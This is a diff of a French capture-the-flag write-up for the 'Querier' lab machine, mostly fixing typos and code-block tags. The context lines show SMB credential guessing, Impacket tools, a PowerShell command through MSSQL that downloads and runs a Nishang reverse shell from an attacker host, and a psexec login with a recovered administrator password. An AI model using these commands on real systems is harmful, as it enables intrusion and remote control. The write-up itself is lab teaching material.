@@ -129,7 +129,7 @@ Pour autant rien n'est venu... Je me suis donc retranché sur le SMB.
 Share plz
 ---------
 
-Il aura fallut remplir quelques options au module *smb\_login* de *Metasploit* pour parvenir à trouver que l'utilisateur *sa* a bien le mot de passe *sa* :p   
+Il aura fallu remplir quelques options au module `smb_login` de *Metasploit* pour parvenir à trouver que l'utilisateur *sa* a bien le mot de passe *sa* :p   
 
 ```
 msf5 auxiliary(scanner/smb/smb_login) > show options
@@ -184,9 +184,9 @@ msf5 auxiliary(scanner/smb/smb_enumshares) > run
 [*] Auxiliary module execution completed
 ```
 
-Pour changer un peut on peut utiliser un outil de *Impacket* au lieu de l’habituel *smbclient* :  
+Pour changer un peu on peut utiliser un outil de *Impacket* au lieu de l'habituel *smbclient* :  
 
-```
+```console
 $ python examples/smbclient.py QUERIER/sa@10.10.10.125
 Impacket v0.9.17 - Copyright 2002-2018 Core Security Technologies
 
@@ -288,7 +288,7 @@ La machine a désactivé l'emploi de SMBv1 donc on doit avoir recours à serveur
 
 *Impacket* fait très bien l'affaire :  
 
-```
+```console
 # python examples/smbserver.py -smb2support public /tmp/
 Impacket v0.9.17 - Copyright 2002-2018 Core Security Technologies
 
@@ -358,9 +358,9 @@ msf5 auxiliary(admin/mssql/mssql_exec) > run
 [*] Auxiliary module execution completed
 ```
 
-Le module ne nous donne pas l'output mais la copie s'est bien effectuée :  
+Le module ne nous donne pas l'output, mais la copie s'est bien effectuée :  
 
-```
+```console
 $ cat /tmp/hello.txt
 querier\mssql-svc
 ```
@@ -432,7 +432,7 @@ Quelle déception ! Mais pas tant de surprise :|
 Windows privesc dor dummies
 ---------------------------
 
-Du coup c'est parti pour l'utilisation de Powershell. Je fais télécharger et exécuter un reverse shell *Nishang* :  
+Du coup, c'est parti pour l'utilisation de Powershell. Je fais télécharger et exécuter un reverse shell *Nishang* :  
 
 ```
 msf5 auxiliary(admin/mssql/mssql_exec) > set CMD 'c:\windows\system32\windowspowershell\v1.0\powershell.exe -nop -exec bypass -c IEX (New-Object System.Net.WebClient).DownloadString(\"http://10.10.14.208:8000/Invoke-PowerShellTcp.ps1\")'
@@ -501,7 +501,7 @@ At line:3704 char:21
 
 Ce dernier nous a trouvé le mot de passe administrateur dans un fichier *Unattend* :)  
 
-```
+```console
 $ python examples/psexec.py 'QUERIER/Administrator:MyUnclesAreMarioAndLuigi!!1!@10.10.10.125'
 Impacket v0.9.17 - Copyright 2002-2018 Core Security Technologies
 
